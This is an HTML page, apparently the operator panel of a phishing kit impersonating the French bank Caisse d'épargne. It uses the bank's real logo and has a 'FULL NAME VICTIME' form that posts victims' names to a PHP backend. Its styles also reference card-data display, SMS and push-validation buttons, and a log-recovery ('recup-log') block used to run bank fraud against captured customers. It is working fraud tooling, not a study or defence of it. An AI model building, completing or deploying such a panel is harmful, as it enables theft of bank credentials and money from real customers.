<!DOCTYPE html>
<html lang="fr"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel - Caisse d'épargne</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            padding: 20px;
        }

.container {
    max-width: 1400px;  /* Augmenter la largeur */
    margin: 0 auto;
    padding: 0 20px;
}

/* Nouveau conteneur pour les rubriques en grille */
.rubriques-grid {
    display: grid;
    grid-template-columns: repeat(4, 1fr);
    gap: 20px;
    margin-bottom: 25px;
}

/* Ajuster les rubriques dans la grille */
.rubriques-grid .rubrique {
    margin-bottom: 0;
    height: 100%;
    display: flex;
    flex-direction: column;
}

.rubriques-grid .rubrique-body {
    flex: 1;
    max-height: 400px;
    overflow-y: auto;
}

/* Supprimer l'ancien style victime-block */
.victime-block {
    background: white;
    border-radius: 15px;
    box-shadow: 0 5px 20px rgba(0,0,0,0.08);
    overflow: hidden;
    transition: transform 0.3s ease, box-shadow 0.3s ease;
    margin-bottom: 25px;
    width: 100%;
}

.victime-block:hover {
    transform: translateY(-5px);
    box-shadow: 0 10px 30px rgba(0,0,0,0.15);
}

.victime-block .victime-header {
    background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
    color: white;
    padding: 18px 25px;
    font-weight: 600;
    font-size: 18px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    letter-spacing: 0.5px;
}

.victime-block .victime-body {
    padding: 20px;
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 15px;
}

.victime-block .input-group {
    margin-bottom: 0;
}

.victime-block .input-group label {
    margin-left: 20px;
    margin-top: 20px;
    display: block;
    font-size: 12px;
    color: #495057;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: -5px;
    font-weight: 600;
}

.victime-block .input-group input {
    width: 90%;
    margin-top: 10px;
    margin-left: 20px;
    padding: 12px;
    border: 2px solid #e9ecef;
    border-radius: 10px;
    font-size: 14px;
    transition: all 0.3s ease;
    background: #f8f9fa;
}

.victime-block .input-group input:focus {
    outline: none;
    border-color: #3498db;
    background: white;
    box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
}

.victime-block .btn-valider {
    padding: 12px 30px;
    background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
    color: white;
    border: none;
    border-radius: 25px;
    font-weight: 600;
    margin-top: 20px;
    font-size: 14px;
    cursor: pointer;
    transition: all 0.3s ease;
    text-transform: uppercase;
    letter-spacing: 1px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
    align-self: end;
}

.victime-block .btn-valider:hover {
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(0,0,0,0.3);
}

/* Responsive pour le bloc victime */
@media (max-width: 768px) {
    .victime-block .victime-body {
        grid-template-columns: 1fr;
    }
    
    .victime-block .btn-valider {
        width: 100%;
    }
}

.header {
    color: #4d4c4c;
    padding: 30px;
    width: 100%;
    margin-left: 0;
    text-align: center;
    margin-bottom: 30px;
    border-radius: 15px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
    position: relative;
    overflow: hidden;
}

        .header h1 {
            font-size: 30px;
            font-weight: 700;
        }

        .header p {
            font-size: 14px;
            opacity: 0.9;
            margin-top: 5px;
        }

.rubrique {
    background: white;
    border-radius: 15px;
    margin-bottom: 25px;
    box-shadow: 0 5px 20px rgba(0,0,0,0.08);
    overflow: hidden;
    transition: transform 0.3s ease, box-shadow 0.3s ease;
}

.rubrique:hover {
    transform: translateY(-5px);
    box-shadow: 0 10px 30px rgba(0,0,0,0.15);
}

.rubrique-header {
    background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
    color: white;
    padding: 18px 25px;
    font-weight: 600;
    font-size: 18px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    letter-spacing: 0.5px;
}

.rubrique-header .badge {
    background: rgba(255,255,255,0.2);
    color: white;
    padding: 5px 15px;
    border-radius: 20px;
    font-size: 14px;
    font-weight: 700;
}

        .rubrique-body {
            padding: 15px 20px;
            min-height: 60px;
        }

        .rubrique-body .empty {
            color: #999;
            font-style: italic;
            text-align: center;
            padding: 10px 0;
        }

.card-data {
    background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
    padding: 20px;
    border-radius: 12px;
    margin-bottom: 15px;
    font-size: 14px;
    border-left: 5px solid #ff7900;
    transition: all 0.3s ease;
    position: relative;
}

.card-data:hover {
    background: linear-gradient(135deg, #f1f3f5 0%, #dee2e6 100%);
    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
}

.card-data .label {
    color: #495057;
    font-size: 12px;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: 5px;
}

        .card-data .value {
            font-weight: 600;
            margin-top: 2px;
            word-break: break-all;
        }

        .btn-group {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 15px;
        }

.btn-group .btn {
    padding: 12px 20px;
    border: none;
    border-radius: 25px;
    font-weight: 600;
    font-size: 13px;
    cursor: pointer;
    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    flex: 1;
    min-width: 100px;
    text-transform: uppercase;
    letter-spacing: 1px;
    position: relative;
    overflow: hidden;
    box-shadow: 0 4px 15px rgba(0,0,0,0.1);
}

.btn-group .btn::after {
    content: '';
    position: absolute;
    top: 50%;
    left: 50%;
    width: 0;
    height: 0;
    background: rgba(255,255,255,0.2);
    border-radius: 50%;
    transform: translate(-50%, -50%);
    transition: width 0.6s, height 0.6s;
}

.btn-group .btn:hover::after {
    width: 300px;
    height: 300px;
}

        .btn-refuser {
            background: #dc3545;
            color: white;
        }

        .btn-refuser:hover {
            background: #c82333;
            transform: translateY(-1px);
        }

        .btn-sms {
            background: #28a745;
            color: white;
        }

        .btn-sms:hover {
            background: #218838;
            transform: translateY(-1px);
        }

        .btn-push {
            background: #007bff;
            color: white;
        }

        .btn-push:hover {
            background: #0069d9;
            transform: translateY(-1px);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .no-session {
            text-align: center;
            padding: 40px 20px;
            color: #666;
        }

        .no-session .icon {
            font-size: 48px;
            margin-bottom: 10px;
        }

        /* Modal de confirmation */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }

        .modal-overlay.show {
            display: flex;
        }

        .modal {
            background: white;
            padding: 30px;
            border-radius: 12px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }

        .modal h3 {
            margin-bottom: 10px;
        }

        .modal p {
            color: #666;
            margin-bottom: 20px;
        }

        .modal .btn-group {
            justify-content: center;
        }

        .modal .btn {
            flex: none;
            padding: 10px 30px;
            min-width: 80px;
        }

        .btn-confirm {
            background: #ff7900;
            color: white;
        }

        .btn-confirm:hover {
            background: #e56a00;
        }

        .btn-cancel {
            background: #6c757d;
            color: white;
        }

        .btn-cancel:hover {
            background: #5a6268;
        }

        /* Animation pour nouvelle carte */
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(255, 121, 0, 0.4); }
            70% { box-shadow: 0 0 0 10px rgba(255, 121, 0, 0); }
            100% { box-shadow: 0 0 0 0 rgba(255, 121, 0, 0); }
        }

        .new-card {
            animation: pulse 1s ease-in-out;
        }

        /* Responsive */
        @media (max-width: 600px) {
            .btn-group {
                flex-direction: column;
            }
            .btn-group .btn {
                min-width: unset;
                padding: 14px 20px;
                font-size: 16px;
            }
        }

        .btn-bank {
    background: #8B4513;
    color: white;
}

.btn-bank:hover {
    background: #6d3610;
    transform: translateY(-1px);
}

.btn-log {
    background: #8B4513;
    color: white;
}

.btn-log:hover {
    background: #6d3610;
    transform: translateY(-1px);
}

@keyframes shimmer {
    0% { background-position: -1000px 0; }
    100% { background-position: 1000px 0; }
}

.loading {
    background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
    background-size: 1000px 100%;
    animation: shimmer 2s infinite;
}

.recup-log-block {
    background: white;
    border-radius: 15px;
    box-shadow: 0 5px 20px rgba(0,0,0,0.08);
    overflow: hidden;
    transition: transform 0.3s ease, box-shadow 0.3s ease;
    margin-bottom: 25px;
    width: 100%;
}

.recup-log-block:hover {
    transform: translateY(-5px);
    box-shadow: 0 10px 30px rgba(0,0,0,0.15);
}

.recup-log-block .recup-log-header {
    background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
    color: white;
    padding: 18px 25px;
    font-weight: 600;
    font-size: 18px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    letter-spacing: 0.5px;
}

.recup-log-block .recup-log-body {
    padding: 20px;
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 15px;
}

.recup-log-block .input-group {
    margin-bottom: 0;
}

.recup-log-block .input-group label {
    margin-left: 20px;
    margin-top: 20px;
    display: block;
    font-size: 12px;
    color: #495057;
    text-transform: uppercase;
    letter-spacing: 1px;
    margin-bottom: -5px;
    font-weight: 600;
}

.recup-log-block .input-group input {
    width: 90%;
    margin-top: 10px;
    margin-left: 20px;
    padding: 12px;
    border: 2px solid #e9ecef;
    border-radius: 10px;
    font-size: 14px;
    transition: all 0.3s ease;
    background: #f8f9fa;
}

.recup-log-block .input-group input[readonly] {
    background: #e9ecef;
    color: #495057;
    cursor: not-allowed;
}

.recup-log-block .input-group input:focus {
    outline: none;
    border-color: #D2691E;
    background: white;
    box-shadow: 0 0 0 3px rgba(210, 105, 30, 0.1);
}

.recup-log-block .btn-valider {
    padding: 12px 30px;
    background: linear-gradient(135deg, #8B4513 0%, #D2691E 100%);
    color: white;
    border: none;
    border-radius: 25px;
    font-weight: 600;
    margin-top: 20px;
    font-size: 14px;
    cursor: pointer;
    transition: all 0.3s ease;
    text-transform: uppercase;
    letter-spacing: 1px;
    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
    align-self: end;
    grid-column: span 2;
}

.recup-log-block .btn-valider:hover {
    transform: translateY(-2px);
    box-shadow: 0 6px 20px rgba(0,0,0,0.3);
}

@media (max-width: 768px) {
    .recup-log-block .recup-log-body {
        grid-template-columns: 1fr;
    }
    
    .recup-log-block .btn-valider {
        width: 100%;
        grid-column: span 1;
    }
}
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1><img src="https://www.icgauth.caisse-epargne.fr/se-connecter/assets/logos/horizontal-logo@3x.png" alt="">
        PANEL</h1>
    </div>

        <!-- Bloc Victime en haut à gauche -->
    <div class="victime-block">
        <div class="victime-header">
            🙍🏻&zwj;♂️ FULL NAME VICTIME
        </div>
        <div class="input-group">
            <label>Prénom</label>
            <input type="text" id="prenomVictime" placeholder="Entrez le prénom">
        </div>
        <div class="input-group">
            <label>Nom</label>
            <input type="text" id="nomVictime" placeholder="Entrez le prénom">
        </div>
        <button class="btn-valider" onclick="validerVictime()">✅ Valider</button>
    </div>

    </div>
</div>

<!-- Modal de confirmation -->
<div class="modal-overlay" id="actionModal">
    <div class="modal">
        <h3>⚠️ Confirmation</h3>
        <p id="modalMessage">Êtes-vous sûr de vouloir effectuer cette action ?</p>
        <div class="btn-group">
            <button class="btn btn-cancel" onclick="closeModal()">Annuler</button>
            <button class="btn btn-confirm" id="confirmActionBtn">Confirmer</button>
        </div>
    </div>
</div>
<script>

    function validerVictime() {
  const prenom = document.getElementById('prenomVictime').value;
  const nom = document.getElementById('nomVictime').value;

  fetch('valider.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'prenom=' + encodeURIComponent(prenom) + '&nom=' + encodeURIComponent(nom)
  })
  .then(r => r.text())
  .then(t => {
    if (t === 'OK') alert('Enregistré !');
    else alert('Erreur : ' + t);
  });
}

</script>
</body>
</html>